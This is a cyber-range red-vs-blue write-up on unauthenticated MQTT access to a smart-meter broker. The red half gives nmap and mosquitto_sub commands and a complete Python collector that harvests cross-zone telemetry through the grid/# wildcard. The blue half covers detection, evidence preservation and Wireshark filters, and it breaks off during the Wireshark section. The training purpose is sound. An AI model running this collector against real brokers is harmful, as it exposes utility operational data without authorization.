# Smart Meter Wildcard Harvest Red vs Blue Writeup

## Red Team Writeup

| **RED TEAM EXPLOITATION GUIDE** |
|---------------------------------|

**Smart-Meter Wildcard Harvest**

|     |
|-----|

Anonymous MQTT Access, Cross-Zone Wildcard Collection and Outage Discovery

Challenge type: OT/ICS \| Protocol: MQTT over TCP \| Participant action: Unauthorized wildcard subscription

| **Document field** | **Value** |
|----|----|
| Guide type | Participant-facing Red Team exploitation guide |
| Starting knowledge | Target address and permitted network access only |
| Exposed service | MQTT over TCP/1883 |
| Primary weakness | Anonymous reads with ineffective topic-level authorization |
| Exploit primitive | Multi-level wildcard subscription: grid/# |
| Successful result | 60 topics, 3 zones, 12 meters and outage meter M010 |
| Primary confirmation | HARVEST_RESULT:PASS from the participant script |

*Prepared for authorized cyber-range training*

# **Contents**

1\. Vulnerability Overview

2\. Participant Objective and Scope

3\. Attack Surface and MQTT Trust Model

4\. Exploitation Workflow

5\. Phase 1 - Target Definition

6\. Phase 2 - MQTT Service Discovery

7\. Phase 3 - Anonymous MQTT Read Verification

8\. Phase 4 - Cross-Zone Wildcard Discovery

9\. Phase 5 - Complete Python Exploit Source

10\. Phase 6 - Execute and Confirm the Exploit

11\. Understanding the Vulnerability

12\. MITRE ATT&CK for ICS Mapping

Appendix A - Participant Command Reference

Appendix B - Expected Output Reference

Appendix C - Common Pitfalls

References

Conclusion

# **1. Vulnerability Overview**

The challenge exposes an MQTT broker on TCP/1883. An external client can connect without presenting a username, password or client certificate and can read smart-meter telemetry. The broker also permits the MQTT multi-level wildcard filter grid/#, allowing one subscription to match every topic under the grid hierarchy.

The weakness is not a malformed-packet or memory-corruption exploit. The participant uses valid MQTT behavior in the expected wire format. The security failure is that the broker does not enforce effective authentication and least-privilege topic authorization for operational telemetry.

| Primary vulnerability: unauthenticated MQTT read access combined with an overbroad multi-level wildcard subscription. The participant can reconstruct cross-zone meter state without host access, credentials or message publication. |
|----|

## **1.1 Confirmed Participant-Side Findings**

| **Finding**                | **Observed result**                         |
|----------------------------|---------------------------------------------|
| Remote service             | MQTT available on TCP/1883                  |
| Authentication requirement | No credentials required for telemetry reads |
| Wildcard filter            | grid/# accepted                             |
| Zones exposed              | zone1, zone2 and zone3                      |
| Meters exposed             | M001 through M012                           |
| Topics collected           | 60 operational telemetry topics             |
| Outage identified          | M010 on FEEDER-SOUTH-A                      |
| Participant success marker | HARVEST_RESULT:PASS                         |

# **2. Participant Objective and Scope**

The objective is to discover the participant-facing MQTT service, confirm anonymous read access, identify the smart-meter topic structure, exploit the broad wildcard subscription and determine which meter reports an outage. All actions are performed from the assigned Kali system against the supplied target address.

## **2.1 Starting Conditions**

- The participant receives the target IP address.

- No MQTT username, password, client certificate or broker configuration is provided.

- The participant performs all actions from the assigned Kali system.

- Only externally observable MQTT responses and participant-generated result files are used.

## **2.2 Participant Boundaries**

- Use only the assigned challenge target.

- Keep the exercise read-only: subscribe and receive; do not publish or modify telemetry.

- Do not access the Ubuntu host, service configuration, system logs or packet capture.

- Do not perform administrative, recovery or defensive actions on the target.

- Stop after cross-zone collection and outage-meter identification are confirmed.

# **3. Attack Surface and MQTT Trust Model**


External participant Kali host

|

| MQTT 3.1.1 over TCP/1883

| CONNECT client ID: zone1-maint-laptop-07

| SUBSCRIBE topic filter: grid/#

v

Participant-facing MQTT broker

|

+--> grid/zone1/meter/M001-M004/<field>

+--> grid/zone2/meter/M005-M008/<field>

+--> grid/zone3/meter/M009-M012/<field>



Fields: id | feeder | load | voltage | outage


The client identifier is participant-selected metadata and does not prove authorization. The broker accepts the connection and subscription even though the client has no supplied identity credentials or zone-specific read permission.

## **3.1 Relevant MQTT Elements**

| **Element** | **Role in the exploit** |
|----|----|
| TCP/1883 | Participant-facing MQTT transport endpoint |
| CONNECT | Establishes a client session using the chosen client identifier |
| Client ID | Labels the session but does not authenticate the participant |
| SUBSCRIBE | Requests delivery for a Topic Filter |
| grid/# | Matches all remaining topic levels below grid/ |
| Retained messages | Provide the current value of each meter field immediately |
| PUBLISH delivery | Returns the matched telemetry to the subscriber |

# **4. Exploitation Workflow**

1.  Record the supplied target address and expected MQTT port.

2.  Perform a focused TCP scan and identify MQTT on port 1883.

3.  Request one known meter topic without credentials.

4.  Subscribe to grid/# and enumerate the cross-zone topic hierarchy.

5.  Create the complete Python wildcard collector.

6.  Run the collector and require 3 zones, 12 meters and one outage record.

7.  Review the structured result and identify the outage meter.

| Success condition: the participant-side collector reports HARVEST_RESULT:PASS, ZONES=3, METERS=12, OUTAGE_METER=M010 and OUTAGE_ZONE=zone3. |
|----|

# **5. Phase 1 - Target Definition**

Use the address supplied by the evaluator. The public address visible in the screenshots belongs to one test environment and must not be treated as a fixed challenge value.


cd ~/smart-meter-demo



export TARGET="<TARGET-IP>"

export MQTT_PORT="1883"



echo "TARGET=$TARGET"

echo "MQTT_PORT=$MQTT_PORT"

echo "ASSESSMENT_TYPE=EXTERNAL_PARTICIPANT"


Recording the target before execution prevents commands from being sent to an unintended host and keeps the remaining procedure portable between deployments.

# **6. Phase 2 - MQTT Service Discovery**

Perform a focused scan against the expected MQTT port. The scan confirms reachability and identifies the application protocol without introducing broad or unrelated traffic.

| nmap -n -Pn -sV -p 1883 "\$TARGET" |
|------------------------------------|

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image5.png" style="width:6.5in;height:2.49419in" />

*Figure 1 - TCP/1883 was reachable and identified as MQTT from the participant Kali host.*

## **6.1 Interpretation**

| **Output** | **Meaning** |
|----|----|
| 1883/tcp open | A TCP connection can be established to the participant-facing service |
| mqtt | The service behavior matches MQTT |
| Host is up | The assigned target responds over the permitted path |

# **7. Phase 3 - Anonymous MQTT Read Verification**

Before requesting the full grid hierarchy, test one known telemetry topic without supplying credentials. This establishes that the issue is not merely service exposure; the broker is returning operational data to an anonymous client.


mosquitto_sub \

-h "$TARGET" \

-p 1883 \

-i participant-recon \

-t 'grid/zone1/meter/M001/id' \

-v \

-C 1 \

-W 8


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image6.png" style="width:4.7in;height:4.3302in" />

*Figure 2 - An unauthenticated subscription returned the identity value for meter M001.*

## **7.1 Why This Confirms Anonymous Read Access**

- No username or password option was supplied to mosquitto_sub.

- No client certificate or TLS identity was presented.

- The broker accepted the subscription request.

- The broker returned the operational value M001.

# **8. Phase 4 - Cross-Zone Wildcard Discovery**

MQTT Topic Filters can include wildcard characters. The multi-level wildcard \# matches every remaining level below its position. Therefore, grid/# requests all topics beneath the grid hierarchy.


mosquitto_sub \

-h "$TARGET" \

-p 1883 \

-i zone1-maint-laptop-07 \

-t 'grid/#' \

-v \

-C 60 \

-W 10 \

| grep -E '/id ' \

| sort


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image7.png" style="width:6.4in;height:2.81362in" />

*Figure 3 - One wildcard subscription exposed meter identities from zone1, zone2 and zone3.*

## **8.1 Topic Structure**

| grid/\<zone\>/meter/\<meter-id\>/\<field\> |
|--------------------------------------------|

| **Topic level** | **Observed values**               |
|-----------------|-----------------------------------|
| Zone            | zone1, zone2, zone3               |
| Meter ID        | M001 through M012                 |
| Field           | id, feeder, load, voltage, outage |

The 60-topic result follows directly from 3 zones Ã— 4 meters per zone Ã— 5 fields per meter. The broad subscription defeats the intended zone separation and exposes operational state across the entire hierarchy.

# **9. Phase 5 - Complete Python Exploit Source**

The following is the complete participant-side source for wildcard_harvest.py. It performs a genuine MQTT 3.1.1 connection, subscribes to grid/#, records each received message, reconstructs complete meter records and identifies the meter whose outage field is true.

| Participant tool requirement: Python 3 with paho-mqtt 2.1.0. The script is read-only and never publishes a message. |
|----|

## **9.1 Imports, Topic Parser and Arguments**


#!/usr/bin/env python3

"""Collect cross-zone smart-meter telemetry through an overbroad MQTT wildcard."""



from __future__ import annotations



import argparse

import json

import threading

import time

from datetime import datetime, timezone

from pathlib import Path



import paho.mqtt.client as mqtt





EXPECTED_FIELDS = {"id", "feeder", "load", "voltage", "outage"}





def utc_now() -> str:

"""Return an ISO-8601 UTC timestamp."""

return datetime.now(timezone.utc).isoformat()





def parse_meter_topic(topic: str) -> tuple[str, str, str] | None:

"""Parse grid/<zone>/meter/<meter-id>/<field> topics."""

parts = topic.split("/")



if len(parts) != 5:

return None



if parts[0] != "grid" or parts[2] != "meter":

return None



zone = parts[1]

meter_id = parts[3]

field = parts[4]



if not zone or not meter_id or field not in EXPECTED_FIELDS:

return None



return zone, meter_id, field





def build_arguments() -> argparse.Namespace:

parser = argparse.ArgumentParser(

description=(

"Collect smart-meter telemetry through an overbroad MQTT "

"multi-level wildcard subscription."

)

)

parser.add_argument("--broker", required=True, help="MQTT broker IP or hostname")

parser.add_argument("--port", type=int, default=1883, help="MQTT TCP port")

parser.add_argument(

"--client-id",

default="zone1-maint-laptop-07",

help="Participant-selected MQTT client identifier",

)

parser.add_argument(

"--topic-filter",

default="grid/#",

help="MQTT subscription filter",

)

parser.add_argument(

"--timeout",

type=float,

default=30.0,

help="Maximum collection duration in seconds",

)

parser.add_argument(

"--expected-zones",

type=int,

default=3,

help="Expected number of grid zones",

)

parser.add_argument(

"--expected-meters",

type=int,

default=12,

help="Expected number of unique meters",

)

parser.add_argument(

"--output",

default="./wildcard-harvest.json",

help="Structured result file",

)

parser.add_argument(

"--messages-output",

default="./wildcard-messages.jsonl",

help="Raw received-message result file",

)

return parser.parse_args()


## **9.2 Connection, Subscription and Message Collection**


def main() -> int:

args = build_arguments()



output_path = Path(args.output)

messages_path = Path(args.messages_output)

output_path.parent.mkdir(parents=True, exist_ok=True)

messages_path.parent.mkdir(parents=True, exist_ok=True)

output_path.unlink(missing_ok=True)

messages_path.unlink(missing_ok=True)



connected = threading.Event()

subscribed = threading.Event()

collection_complete = threading.Event()



records: list[dict[str, object]] = []

meter_facts: dict[str, dict[str, str]] = {}

first_message_utc: str | None = None

last_message_utc: str | None = None

started_at_utc = utc_now()



def on_connect(client, userdata, flags, reason_code, properties) -> None:

if reason_code != 0:

print(f"[-] MQTT connection failed: reason={reason_code}", flush=True)

collection_complete.set()

return



connected.set()

print(

f"[+] Connected to {args.broker}:{args.port} "

f"as client ID {args.client_id}",

flush=True,

)



result, _message_id = client.subscribe(args.topic_filter, qos=0)

if result != mqtt.MQTT_ERR_SUCCESS:

print(f"[-] Subscription request failed: rc={result}", flush=True)

collection_complete.set()

return



print(f"[+] Requested subscription: {args.topic_filter}", flush=True)



def on_subscribe(client, userdata, message_id, reason_codes, properties) -> None:

subscribed.set()

print(f"[+] Subscription acknowledged: {args.topic_filter}", flush=True)



def on_message(client, userdata, message) -> None:

nonlocal first_message_utc, last_message_utc



timestamp = utc_now()

payload = message.payload.decode("utf-8", errors="replace")

parsed = parse_meter_topic(message.topic)



record = {

"timestamp_utc": timestamp,

"client_id": args.client_id,

"topic_filter": args.topic_filter,

"topic": message.topic,

"payload": payload,

"qos": message.qos,

"retain": message.retain,

}

records.append(record)



with messages_path.open("a", encoding="utf-8") as handle:

handle.write(json.dumps(record, sort_keys=True) + "\n")



if first_message_utc is None:

first_message_utc = timestamp

last_message_utc = timestamp



if parsed:

zone, meter_id, field = parsed

key = f"{zone}/{meter_id}"

meter_facts.setdefault(key, {"zone": zone, "meter_id": meter_id})

meter_facts[key][field] = payload



complete_meters = [

facts

for facts in meter_facts.values()

if EXPECTED_FIELDS.issubset(facts.keys())

]

if len(complete_meters) >= args.expected_meters:

collection_complete.set()


## **9.3 Result Construction and Exploit Decision Logic**


client = mqtt.Client(

callback_api_version=mqtt.CallbackAPIVersion.VERSION2,

client_id=args.client_id,

clean_session=True,

protocol=mqtt.MQTTv311,

)

client.on_connect = on_connect

client.on_subscribe = on_subscribe

client.on_message = on_message



try:

client.connect(args.broker, args.port, keepalive=30)

except Exception as exc:

print(f"[-] Broker connection failed: {exc}", flush=True)

return 1



client.loop_start()

deadline = time.monotonic() + args.timeout



try:

while time.monotonic() < deadline:

if collection_complete.wait(timeout=0.25):

break

except KeyboardInterrupt:

print("[-] Collection interrupted by participant", flush=True)

finally:

try:

client.disconnect()

finally:

client.loop_stop()



zones = sorted({facts["zone"] for facts in meter_facts.values()})

meters = sorted({facts["meter_id"] for facts in meter_facts.values()})



complete_meter_facts = sorted(

[

facts

for facts in meter_facts.values()

if EXPECTED_FIELDS.issubset(facts.keys())

],

key=lambda item: (item["zone"], item["meter_id"]),

)



outage_meters = sorted(

[

{

"zone": facts["zone"],

"meter_id": facts["meter_id"],

"feeder": facts["feeder"],

"load": facts["load"],

"voltage": facts["voltage"],

"outage": facts["outage"],

}

for facts in complete_meter_facts

if facts.get("outage", "").lower() == "true"

],

key=lambda item: item["meter_id"],

)



result = {

"challenge": "Smart-Meter Wildcard Harvest",

"started_at_utc": started_at_utc,

"completed_at_utc": utc_now(),

"first_message_utc": first_message_utc,

"last_message_utc": last_message_utc,

"broker": args.broker,

"port": args.port,

"client_id": args.client_id,

"topic_filter": args.topic_filter,

"message_count": len(records),

"unique_topic_count": len({record["topic"] for record in records}),

"zones": zones,

"zone_count": len(zones),

"meters": meters,

"meter_count": len(meters),

"meter_facts": complete_meter_facts,

"outage_meters": outage_meters,

}



output_path.write_text(

json.dumps(result, indent=2, sort_keys=True) + "\n",

encoding="utf-8",

)



print(

f"[+] Collected {len(records)} messages across "

f"{len(zones)} zones and {len(meters)} meters",

flush=True,

)



for outage in outage_meters:

print(

"[+] Outage meter: "

f"ZONE={outage['zone']} "

f"METER={outage['meter_id']} "

f"FEEDER={outage['feeder']} "

f"LOAD={outage['load']} "

f"VOLTAGE={outage['voltage']}",

flush=True,

)



print(f"[+] Results written to {output_path}", flush=True)



valid = (

connected.is_set()

and subscribed.is_set()

and args.topic_filter == "grid/#"

and len(zones) == args.expected_zones

and len(meters) == args.expected_meters

and len(complete_meter_facts) == args.expected_meters

and len(outage_meters) == 1

)



if valid:

outage = outage_meters[0]

print(

"HARVEST_RESULT:PASS "

f"CLIENT_ID={args.client_id} "

f"FILTER={args.topic_filter} "

f"ZONES={len(zones)} "

f"METERS={len(meters)} "

f"OUTAGE_METER={outage['meter_id']} "

f"OUTAGE_ZONE={outage['zone']}"

)

return 0



print(

"HARVEST_RESULT:FAIL "

f"ZONES={len(zones)} "

f"METERS={len(meters)} "

f"OUTAGES={len(outage_meters)}"

)

return 1





if __name__ == "__main__":

raise SystemExit(main())


## **9.4 What the Script Does**

- Connects to the supplied broker over MQTT 3.1.1.

- Uses the participant-selected client ID zone1-maint-laptop-07.

- Requests the multi-level wildcard filter grid/#.

- Parses only grid/\<zone\>/meter/\<meter-id\>/\<field\> telemetry.

- Waits until all five expected fields are available for 12 meters.

- Writes a structured JSON result and a JSONL message list.

- Returns exit code 0 only when the complete cross-zone result and one outage record are present.

# **10. Phase 6 - Execute and Confirm the Exploit**

Save the complete source as wildcard_harvest.py, check its Python syntax and execute it against the assigned target.


python3 -m py_compile wildcard_harvest.py



python3 wildcard_harvest.py \

--broker "$TARGET" \

--port 1883 \

--client-id zone1-maint-laptop-07 \

--topic-filter 'grid/#' \

--timeout 30 \

--expected-meters 12 \

--output ./wildcard-harvest.json \

--messages-output ./wildcard-messages.jsonl


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image8.png" style="width:6.5in;height:1.36544in" />

*Figure 4 - The wildcard collector received 60 messages across three zones and 12 meters.*

## **10.1 Required Success Output**


[+] Connected to <TARGET-IP>:1883 as client ID zone1-maint-laptop-07

[+] Requested subscription: grid/#

[+] Subscription acknowledged: grid/#

[+] Collected 60 messages across 3 zones and 12 meters

[+] Outage meter: ZONE=zone3 METER=M010 FEEDER=FEEDER-SOUTH-A LOAD=0.0 VOLTAGE=0.0

HARVEST_RESULT:PASS CLIENT_ID=zone1-maint-laptop-07 FILTER=grid/# ZONES=3 METERS=12 OUTAGE_METER=M010 OUTAGE_ZONE=zone3


The PASS decision requires both protocol success and the expected operational result. A connection alone is insufficient. The script must receive the complete meter set across all three zones and identify exactly one outage record.

## **10.2 Review the Cross-Zone Result**


python3 - <<'PY'

import json



with open("wildcard-harvest.json", encoding="utf-8") as handle:

data = json.load(handle)



print("===== WILDCARD HARVEST SUMMARY =====")

print(f"TARGET={data['broker']}:{data['port']}")

print(f"CLIENT_ID={data['client_id']}")

print(f"TOPIC_FILTER={data['topic_filter']}")

print(f"MESSAGES_COLLECTED={data['message_count']}")

print(f"UNIQUE_TOPICS={data['unique_topic_count']}")

print(f"ZONES_DISCOVERED={data['zone_count']}")

print(f"ZONE_LIST={','.join(data['zones'])}")

print(f"METERS_DISCOVERED={data['meter_count']}")

print(f"METER_LIST={','.join(data['meters'])}")

print("CROSS_ZONE_HARVEST:PASS")

PY


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image9.png" style="width:6in;height:1.94649in" />

*Figure 5 - The participant result confirms 60 unique topics, three zones and 12 meters.*

## **10.3 Identify the Outage Meter**


python3 - <<'PY'

import json



with open("wildcard-harvest.json", encoding="utf-8") as handle:

data = json.load(handle)



print("===== OUTAGE METER IDENTIFICATION =====")

outages = data.get("outage_meters", [])

if not outages:

print("OUTAGE_METER_FOUND=false")

raise SystemExit(1)



for meter in outages:

print(f"ZONE={meter['zone']}")

print(f"METER_ID={meter['meter_id']}")

print(f"FEEDER={meter['feeder']}")

print(f"LOAD={meter['load']}")

print(f"VOLTAGE={meter['voltage']}")

print(f"OUTAGE={meter['outage']}")



print("OUTAGE_METER_FOUND=true")

print("SMART_METER_OUTAGE_DISCOVERY:PASS")

PY


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/red/media/image10.png" style="width:5.2in;height:1.76604in" />

*Figure 6 - M010 in zone3 on FEEDER-SOUTH-A is the meter reporting an outage.*

# **11. Understanding the Vulnerability**

## **11.1 Root Cause**

- The participant-facing broker accepts a connection without supplied identity credentials.

- The broker permits reads from operational smart-meter topics.

- The broker does not effectively restrict the client to one assigned zone.

- The broad Topic Filter grid/# is accepted and matched against all grid telemetry.

- Retained values make the current state immediately available after subscription.

## **11.2 Why the Exploit Works**

The exploit uses legitimate MQTT features rather than corrupting the service. The client sends a normal CONNECT followed by a normal SUBSCRIBE request. The security boundary fails because the broker authorizes a broad read that should have been rejected or narrowed to an approved zone-specific branch.

The chosen client identifier resembles a maintenance endpoint, but it is only a participant-controlled string. The exploit succeeds because the broker does not require proof that the participant owns or is authorized to use that identity.

## **11.3 Security Impact**

| **Risk factor** | **Assessment** |
|----|----|
| Authentication | Unauthenticated telemetry reads are accepted |
| Authorization | No effective least-privilege topic restriction |
| Operational visibility | Three zones and 12 meter identities exposed |
| Process-state disclosure | Load, voltage, feeder and outage state disclosed |
| Target profiling | Operational hierarchy can be reconstructed remotely |
| Direct process modification | Not required for successful exploitation |

| The challenge demonstrates confidentiality and operational-intelligence impact. The participant does not need to publish a command or alter process state to obtain sensitive cross-zone information. |
|----|

# **12. MITRE ATT&CK for ICS Mapping**

| **Mapping** | **Technique** | **Presence in this challenge** |
|----|----|----|
| TA0100 - Collection | T0802 - Automated Collection | A script automatically collects industrial environment information across multiple smart-meter topics. |

The mapping focuses on the automated collection behavior demonstrated by the Python subscriber. Reconnaissance and topic enumeration support the solve path, while the central participant outcome is systematic collection of operational ICS information.

# **Appendix A - Participant Command Reference**

| **Task** | **Command** |
|----|----|
| Set target | export TARGET="\<TARGET-IP\>" |
| Focused scan | nmap -n -Pn -sV -p 1883 "\$TARGET" |
| Anonymous read | mosquitto_sub -h "\$TARGET" -p 1883 -i participant-recon -t 'grid/zone1/meter/M001/id' -v -C 1 -W 8 |
| Cross-zone discovery | mosquitto_sub -h "\$TARGET" -p 1883 -i zone1-maint-laptop-07 -t 'grid/#' -v -C 60 -W 10 |
| Syntax check | python3 -m py_compile wildcard_harvest.py |
| Execute exploit | python3 wildcard_harvest.py --broker "\$TARGET" --port 1883 --client-id zone1-maint-laptop-07 --topic-filter 'grid/#' --timeout 30 --expected-meters 12 |

# **Appendix B - Expected Output Reference**

## **B.1 MQTT Reconnaissance**

| 1883/tcp open mqtt |
|--------------------|

## **B.2 Anonymous Read**

| grid/zone1/meter/M001/id M001 |
|-------------------------------|

## **B.3 Cross-Zone Collection**


MESSAGES_COLLECTED=60

UNIQUE_TOPICS=60

ZONES_DISCOVERED=3

ZONE_LIST=zone1,zone2,zone3

METERS_DISCOVERED=12

CROSS_ZONE_HARVEST:PASS


## **B.4 Outage Finding**


ZONE=zone3

METER_ID=M010

FEEDER=FEEDER-SOUTH-A

LOAD=0.0

VOLTAGE=0.0

OUTAGE=true

SMART_METER_OUTAGE_DISCOVERY:PASS


# **Appendix C - Common Pitfalls**

- Treating the screenshot address as a permanent target instead of using the evaluator-supplied address.

- Omitting -v from mosquitto_sub and therefore losing the topic name needed for hierarchy analysis.

- Using grid/+ instead of grid/#; + matches only one topic level and will not traverse the complete hierarchy.

- Stopping after one returned topic instead of proving access across all three zones.

- Running the Python script without the paho-mqtt package available.

- Calling the exploit successful without HARVEST_RESULT:PASS and the M010 outage finding.

- Publishing MQTT messages; this exercise is intentionally read-only.

# **References**

- OASIS. MQTT Version 3.1.1, Topic Names and Topic Filters.

- Eclipse Mosquitto. mosquitto_sub command-line subscriber documentation.

- Eclipse Paho. MQTT Python Client documentation.

- MITRE ATT&CK for ICS. T0802 - Automated Collection.

- MITRE ATT&CK for ICS. TA0100 - Collection.

# **Conclusion**

Starting with only the assigned target address, the participant identified MQTT on TCP/1883, confirmed that a telemetry topic could be read without credentials and demonstrated that the multi-level wildcard grid/# exposed the complete grid hierarchy.

The automated collector received 60 topics covering three zones and 12 smart meters. The result identified meter M010 in zone3 on FEEDER-SOUTH-A as the outage meter, with load and voltage both reported as 0.0.

| Participant success principle: external MQTT access, accepted grid/# subscription, complete cross-zone collection and correct M010 outage identification must all be demonstrated from the participant side. |
|----|

---

## Blue Team Writeup

**SMART-METER\
WILDCARD HARVEST**

**Blue Team Investigation, Network Forensics, Containment and Recovery Guide**

|     |     |     |
|-----|-----|-----|

| **Document Field** | **Value** |
|----|----|
| Challenge | Smart-Meter Wildcard Harvest |
| Module | Blue Team / Red-vs-Blue |
| Deployment model | Native Ubuntu 22.04 virtual machine |
| Primary protocol | MQTT over TCP/1883 |
| Primary evidence | Mosquitto logs, native PCAP, systemd logs and Blue investigation output |
| Validated attack behavior | Unauthorized external subscription to grid/# with cross-zone telemetry collection |
| Document status | Detailed solution writeup |
| Prepared date | 21 July 2026 |


**Operational note**


The IP addresses shown in the Wireshark figures are validation-environment examples. They must not be hardcoded into deployment scripts, detections or documentation. Analysts should always use the addresses observed in the active exercise.


# Contents

1\. Executive summary

2\. Incident scenario and Blue Team objectives

3\. Native VM environment and evidence sources

4\. Detection trigger and initial triage

5\. Evidence preservation and chain of custody

6\. Wireshark network-forensics investigation

7\. Mosquitto broker-log investigation

8\. Automated investigation using Blue-Analyze.sh

9\. Incident timeline and technical findings

10\. Root-cause analysis and security impact

11\. Containment procedure

12\. Post-containment verification

13\. Recovery and clean reset

14\. Hardening and prevention recommendations

15\. Indicators of compromise and ATT&CK mapping

16\. Blue Team completion checklist

17\. Command-reference appendix

18\. Conclusion

# 1. Executive summary

The incident involves an external MQTT client that connects to the smart-meter broker without credentials and subscribes to the multi-level wildcard filter grid/#. Because the broker does not enforce appropriate authentication and topic-level authorization, the client receives retained telemetry for all available grid zones rather than only its intended operational scope.

The validated attack exposed 60 retained MQTT messages covering 12 meters across zone1, zone2 and zone3. The collected telemetry included meter identifiers, feeder assignments, load, voltage and outage state. The client also identified M010 on FEEDER-SOUTH-A as reporting load 0.0, voltage 0.0 and outage true.


**Blue Team outcome**


A successful investigation must identify the external source IP, the unauthorized MQTT client identifier, the grid/# wildcard subscription, the 60 cross-zone PUBLISH messages, the 12 affected meters and the M010 outage disclosure. The team must then contain the source without interrupting legitimate internal telemetry, verify the block, and restore the challenge to a clean baseline.


| **Validated element** | **Observed result** |
|----|----|
| Unauthorized client identifier | zone1-maint-laptop-07 |
| Unauthorized subscription filter | grid/# |
| Validation capture source | 152.58.32.244 (environment-specific) |
| Validation target | 159.89.165.53:1883 (environment-specific) |
| Messages collected | 60 retained MQTT messages |
| Scope exposed | 3 zones and 12 meters |
| Critical operational finding | M010 / FEEDER-SOUTH-A / load 0.0 / voltage 0.0 / outage true |

# 2. Incident scenario and Blue Team objectives

A utility smart-meter environment uses MQTT to distribute meter telemetry to zone-specific operational displays. Each legitimate display should consume only the topics required for its assigned zone. An external maintenance-style client connects to the broker and requests the broad wildcard filter grid/#, enabling immediate collection of telemetry from every zone.

The exercise is designed as an investigation and response task rather than a service-outage task. The core MQTT service remains operational during the incident, but the security posture is considered compromised until the external source is contained.

| **Objective** | **Required Blue Team result** |
|----|----|
| Identify the attacker | Correlate source IP with the MQTT client identifier. |
| Confirm the collection method | Locate the SUBSCRIBE request for grid/#. |
| Determine data exposure | Prove delivery of telemetry from zone1, zone2 and zone3. |
| Quantify scope | Count 60 messages, 12 meters and 3 zones. |
| Identify sensitive finding | Confirm M010 outage=true with load and voltage at 0.0. |
| Contain the incident | Block the observed external source on TCP/1883. |
| Validate containment | Confirm legitimate MQTT operation remains available and the attacker cannot reconnect. |
| Recover | Reset the incident state and return to SERVICE_STATUS:UP. |

# 3. Native VM environment and evidence sources

The challenge runs directly on Ubuntu 22.04 using native packages and systemd services. Docker and Docker Compose are not required. This allows the Blue Team to investigate operating-system files, broker logs and packet captures directly on the VM.

| **Component** | **Purpose** |
|----|----|
| mosquitto.service | Native MQTT broker listening on TCP/1883. |
| smart-meter-zone1/2/3-publisher.service | Publishes retained smart-meter telemetry for each zone. |
| smart-meter-zone1/2/3-subscriber.service | Represents legitimate zone-specific operational displays. |
| smart-meter-wildcard-pcap.service | Captures MQTT network traffic natively with tcpdump. |
| service-check.sh / validate.sh | Evaluates systemd, listener, functional MQTT and security-state vectors. |
| Blue-Analyze.sh | Correlates broker activity and summarizes the unauthorized wildcard harvest. |
| contain.sh | Creates a source-specific firewall rule for TCP/1883. |
| reset.sh | Clears containment and incident state and restores a clean baseline. |

| **Evidence source** | **Native path** |
|----|----|
| Mosquitto broker log | /opt/ot-challenges/mqtt-smart-meter-wildcard-harvest/logs/mosquitto/mosquitto.log |
| Publisher logs | /opt/ot-challenges/mqtt-smart-meter-wildcard-harvest/logs/publishers/ |
| Subscriber logs | /opt/ot-challenges/mqtt-smart-meter-wildcard-harvest/logs/subscribers/ |
| Packet capture | /opt/ot-challenges/mqtt-smart-meter-wildcard-harvest/logs/pcap/smart-meter-mqtt.pcap |
| Investigation output | /opt/ot-challenges/mqtt-smart-meter-wildcard-harvest/evidence/ |
| systemd journal | journalctl -u \<service-name\> |

# 4. Detection trigger and initial triage

The service-availability logic uses three independent vectors: systemd service state, the MQTT TCP listener and functional/security state. During a successful wildcard harvest, legitimate services continue running, but the security vector changes to COMPROMISED and the overall result becomes SERVICE_STATUS:DOWN.


cd /root/Smart-Meter-Wildcard-Harvest/Smart-Meter-Wildcard-Harvest-Red-vs-Blue-Module



set +e

./validate.sh | tee /root/smart-meter-post-attack.log

RC=${PIPESTATUS[0]}

set -e



echo "POST_ATTACK_VALIDATION_RC=$RC"



**Expected compromised-state indicators**


SECURITY_STATE:COMPROMISED, CLIENT_ID=zone1-maint-laptop-07, FILTER=grid/#, FAILED_CHECKS=1, SERVICE_STATUS:DOWN and a non-zero validation return code.


Initial triage should determine whether the issue is service failure or unauthorized data access. Because Mosquitto, publishers, subscribers and packet capture remain active, the analyst should treat the event as a confidentiality and authorization incident rather than a broker availability failure.

# 5. Evidence preservation and chain of custody

Preserve volatile and file-based evidence before containment or reset. The packet capture may be actively written, so pause only the capture service long enough to create a consistent copy. Do not stop Mosquitto or the telemetry publishers during evidence collection.


INSTALL_ROOT="/opt/ot-challenges/mqtt-smart-meter-wildcard-harvest"

CASE_ID="SMWH-$(date -u +%Y%m%dT%H%M%SZ)"

CASE_DIR="/root/Blue-Evidence/$CASE_ID"



install -d -m 0700 "$CASE_DIR"



systemctl stop smart-meter-wildcard-pcap.service

cp --preserve=all "$INSTALL_ROOT/logs/pcap/smart-meter-mqtt.pcap" "$CASE_DIR/smart-meter-mqtt.pcap"

systemctl start smart-meter-wildcard-pcap.service



cp --preserve=all "$INSTALL_ROOT/logs/mosquitto/mosquitto.log" "$CASE_DIR/mosquitto.log"



journalctl -u mosquitto.service --no-pager > "$CASE_DIR/mosquitto-journal.txt"



sha256sum "$CASE_DIR"/* > "$CASE_DIR/SHA256SUMS"

ls -lh "$CASE_DIR"

cat "$CASE_DIR/SHA256SUMS"


Record the UTC collection time, analyst name, source paths and hashes in the incident record. Perform analysis on copies whenever practical and retain the original files unchanged.

# 6. Wireshark network-forensics investigation

Open the preserved PCAP in Wireshark. The display filters below isolate the external MQTT session and provide packet-level proof of the client identity, wildcard subscription, cross-zone PUBLISH delivery and M010 outage disclosure.

## 6.1 Attack-session overview

Filter the capture by MQTT protocol and the observed external source address:

| mqtt && ip.addr == \<ATTACKER-IP\> |
|------------------------------------|

The packet sequence should include CONNECT, CONNACK, SUBSCRIBE, SUBACK, retained PUBLISH messages and DISCONNECT. This sequence proves a complete MQTT client session rather than an isolated scan or failed connection.

